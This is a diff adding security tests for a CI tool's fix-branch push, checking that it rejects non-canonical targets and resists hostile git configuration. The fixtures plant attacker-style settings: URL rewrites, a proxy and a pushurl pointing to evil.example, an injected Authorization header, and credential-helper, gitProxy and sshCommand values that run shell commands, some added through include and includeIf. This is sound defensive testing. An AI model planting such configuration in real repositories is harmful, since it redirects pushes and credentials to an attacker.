@@ -1,7 +1,15 @@
 import { CiResultAssertions } from "./result-assertions.js";
 import assert from "node:assert/strict";
 import { execFile } from "node:child_process";
-import { access, chmod, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
+import {
+  access,
+  chmod,
+  mkdir,
+  mkdtemp,
+  readFile,
+  rm,
+  writeFile,
+} from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, it } from "node:test";
@@ -87,6 +95,35 @@ void describe("countAuthoredNumstat", () => {
 });
 
 void describe("implementation working tree", () => {
+  void it("rejects non-canonical publication targets", async () => {
+    const previousServerUrl = process.env.GITHUB_SERVER_URL;
+    const previousRepository = process.env.GITHUB_REPOSITORY;
+    process.env.GITHUB_SERVER_URL = "https://github.com";
+    process.env.GITHUB_REPOSITORY = "meta-secret/nook";
+    try {
+      await new CiRepository("/not-a-repository")
+        .pushFixBranch({
+          fixBranch: "fix/dependency-update",
+          remoteRef: "refs/heads/main",
+          remoteUrl: "https://github.com/other/repository.git",
+          runId: "42",
+        })
+        .then((result) =>
+          CiResultAssertions.assertFailure(
+            result,
+            /canonical workflow target/u,
+          ),
+        );
+    } finally {
+      if (typeof previousServerUrl === "string")
+        process.env.GITHUB_SERVER_URL = previousServerUrl;
+      else delete process.env.GITHUB_SERVER_URL;
+      if (typeof previousRepository === "string")
+        process.env.GITHUB_REPOSITORY = previousRepository;
+      else delete process.env.GITHUB_REPOSITORY;
+    }
+  });
+
   void it("marks the worktree safe before inspecting its state", async () => {
     const tempRoot = await mkdtemp(join(tmpdir(), "nook-ci-agent-safe-"));
     const repoRoot = join(tempRoot, "repo");
@@ -127,7 +164,18 @@ void describe("implementation working tree", () => {
     const remoteRoot = join(tempRoot, "remote.git");
     const hooksRoot = join(repoRoot, "attacker-hooks");
     const marker = join(tempRoot, "hook-ran");
+    const includedConfig = join(tempRoot, "included.gitconfig");
+    const includedMarker = join(tempRoot, "included-config-ran");
+    const pushLog = join(tempRoot, "push.json");
+    const fakeGitRoot = join(tempRoot, "bin");
+    const fakeGit = join(fakeGitRoot, "git");
     const previousToken = process.env.NOOK_GITHUB_PAT;
+    const previousServerUrl = process.env.GITHUB_SERVER_URL;
+    const previousRepository = process.env.GITHUB_REPOSITORY;
+    const previousPath = process.env.PATH;
+    const previousRealGit = process.env.CI_TEST_REAL_GIT;
+    const previousRemoteRoot = process.env.CI_TEST_REMOTE_ROOT;
+    const previousPushLog = process.env.CI_TEST_PUSH_LOG;
     const git = (...args: string[]) =>
       execFileAsync("git", ["-C", repoRoot, ...args]);
     try {
@@ -155,6 +203,59 @@ void describe("implementation working tree", () => {
       }
       await git("config", "core.hooksPath", "attacker-hooks");
       await writeFile(join(repoRoot, "README.md"), "trusted update\n");
+      await mkdir(fakeGitRoot);
+      const realGit = (
+        await execFileAsync("which", ["git"], { encoding: "utf8" })
+      ).stdout.trim();
+      await writeFile(
+        fakeGit,
+        `#!/usr/bin/env node
+import { appendFileSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+
+const args = process.argv.slice(2);
+const push = args.includes("push");
+const environment = { ...process.env };
+if (push) {
+  appendFileSync(
+    process.env.CI_TEST_PUSH_LOG,
+    JSON.stringify({
+      args,
+      allowProtocol: process.env.GIT_ALLOW_PROTOCOL,
+      configPath: process.env.GIT_CONFIG,
+      configCount: process.env.GIT_CONFIG_COUNT,
+      configGlobal: process.env.GIT_CONFIG_GLOBAL,
+      configNoSystem: process.env.GIT_CONFIG_NOSYSTEM,
+      extraHeaderConfigured: process.env.NOOK_GIT_EXTRAHEADER !== undefined,
+      noReplaceObjects: process.env.GIT_NO_REPLACE_OBJECTS,
+    }) + "\\n",
+  );
+  const remoteIndex = args.indexOf("https://github.com/meta-secret/nook.git");
+  if (remoteIndex >= 0) args[remoteIndex] = process.env.CI_TEST_REMOTE_ROOT;
+  for (const option of ["protocol.allow=never", "protocol.file.allow=never"]) {
+    const configIndex = args.indexOf(option);
+    if (configIndex > 0 && args[configIndex - 1] === "-c") {
+      args.splice(configIndex - 1, 2);
+      delete environment.GIT_ALLOW_PROTOCOL;
+    }
+  }
+}
+const result = spawnSync(process.env.CI_TEST_REAL_GIT, args, {
+  encoding: "utf8",
+  env: environment,
+});
+if (result.stdout) process.stdout.write(result.stdout);
+if (result.stderr) process.stderr.write(result.stderr);
+process.exit(result.status ?? 1);
+`,
+      );
+      await chmod(fakeGit, 0o755);
+      process.env.GITHUB_SERVER_URL = "https://github.com";
+      process.env.GITHUB_REPOSITORY = "meta-secret/nook";
+      process.env.CI_TEST_REAL_GIT = realGit;
+      process.env.CI_TEST_REMOTE_ROOT = remoteRoot;
+      process.env.CI_TEST_PUSH_LOG = pushLog;
+      process.env.PATH = `${fakeGitRoot}:${previousPath}`;
       process.env.NOOK_GITHUB_PAT = "publication-secret";
 
       await new CiRepository(repoRoot)
@@ -165,6 +266,24 @@ void describe("implementation working tree", () => {
         .then(CiResultAssertions.assertSuccess);
 
       await assert.rejects(access(marker), /ENOENT/);
+      const publication = await readFile(pushLog, "utf8");
+      for (const argument of [
+        "--no-verify",
+        "https://github.com/meta-secret/nook.git",
+        "HEAD:refs/heads/fix/dependency-update",
+        "--config-env=http.https://github.com/.extraheader=NOOK_GIT_EXTRAHEADER",
+      ])
+        assert.match(publication, new RegExp(`\\"${argument}\\"`, "u"));
+      assert.doesNotMatch(publication, /"--force/u);
+      assert.doesNotMatch(publication, /publication-secret/u);
+      assert.doesNotMatch(publication, /"origin"/u);
+      assert.match(publication, /"allowProtocol":"https"/u);
+      assert.match(publication, /"configPath":"\/dev\/null"/u);
+      assert.doesNotMatch(publication, /"configCount"/u);
+      assert.match(publication, /"configGlobal":"\/dev\/null"/u);
+      assert.match(publication, /"configNoSystem":"1"/u);
+      assert.match(publication, /"extraHeaderConfigured":true/u);
+      assert.match(publication, /"noReplaceObjects":"1"/u);
       const { stdout } = await execFileAsync("git", [
         "--git-dir",
         remoteRoot,
@@ -172,10 +291,99 @@ void describe("implementation working tree", () => {
         "refs/heads/fix/dependency-update",
       ]);
       assert.match(stdout.trim(), /^[0-9a-f]{40}$/u);
+
+      await git(
+        "config",
+        "url.https://evil.example/.insteadOf",
+        "https://github.com/",
+      );
+      await writeFile(join(repoRoot, "README.md"), "rewritten update\n");
+      await new CiRepository(repoRoot)
+        .pushFixBranch({
+          fixBranch: "fix/dependency-update",
+          runId: "43",
+        })
+        .then((result) =>
+          CiResultAssertions.assertFailure(result, /git command failed/u),
+        );
+      assert.equal(
+        (await readFile(pushLog, "utf8")).trim().split("\n").length,
+        1,
+      );
+
+      await git("config", "--unset", "url.https://evil.example/.insteadOf");
+      await writeFile(
+        includedConfig,
+        `[url "https://evil.example/"]
+  insteadOf = https://github.com/
+[http "https://github.com/"]
+  proxy = http://proxy.evil.example:8080
+  extraHeader = Authorization: basic included
+[credential]
+  helper = !printf included > '${includedMarker}'
+[protocol "file"]
+  allow = always
+[core]
+  gitProxy = !printf included > '${includedMarker}'
+  sshCommand = printf included > '${includedMarker}'
+  hooksPath = attacker-hooks
+[remote "origin"]
+  pushurl = https://evil.example/repository.git
+`,
+      );
+      await git("config", "include.path", includedConfig);
+      await writeFile(join(repoRoot, "README.md"), "included update\n");
+      await new CiRepository(repoRoot)
+        .pushFixBranch({
+          fixBranch: "fix/dependency-update",
+          runId: "44",
+        })
+        .then((result) =>
+          CiResultAssertions.assertFailure(result, /git command failed/u),
+        );
+      assert.equal(
+        (await readFile(pushLog, "utf8")).trim().split("\n").length,
+        1,
+      );
+      await assert.rejects(access(includedMarker), /ENOENT/);
+
+      await git("config", "--unset", "include.path");
+      await git("config", "includeIf.gitdir:foo.path", includedConfig);
+      await writeFile(join(repoRoot, "README.md"), "conditional update\n");
+      await new CiRepository(repoRoot)
+        .pushFixBranch({
+          fixBranch: "fix/dependency-update",
+          runId: "45",
+        })
+        .then((result) =>
+          CiResultAssertions.assertFailure(result, /git command failed/u),
+        );
+      assert.equal(
+        (await readFile(pushLog, "utf8")).trim().split("\n").length,
+        1,
+      );
+      await assert.rejects(access(includedMarker), /ENOENT/);
     } finally {
       if (typeof previousToken === "string")
         process.env.NOOK_GITHUB_PAT = previousToken;
       else delete process.env.NOOK_GITHUB_PAT;
+      if (typeof previousServerUrl === "string")
+        process.env.GITHUB_SERVER_URL = previousServerUrl;
+      else delete process.env.GITHUB_SERVER_URL;
+      if (typeof previousRepository === "string")
+        process.env.GITHUB_REPOSITORY = previousRepository;
+      else delete process.env.GITHUB_REPOSITORY;
+      if (typeof previousPath === "string") process.env.PATH = previousPath;
+      else delete process.env.PATH;
+      if (typeof previousRealGit === "string")
+        process.env.CI_TEST_REAL_GIT = previousRealGit;
+      else delete process.env.CI_TEST_REAL_GIT;
+      if (typeof previousRemoteRoot === "string")
+        process.env.CI_TEST_REMOTE_ROOT = previousRemoteRoot;
+      else delete process.env.CI_TEST_REMOTE_ROOT;
+      if (typeof previousPushLog === "string")
+        process.env.CI_TEST_PUSH_LOG = previousPushLog;
+      else delete process.env.CI_TEST_PUSH_LOG;
       await rm(tempRoot, { recursive: true, force: true });
     }
   });
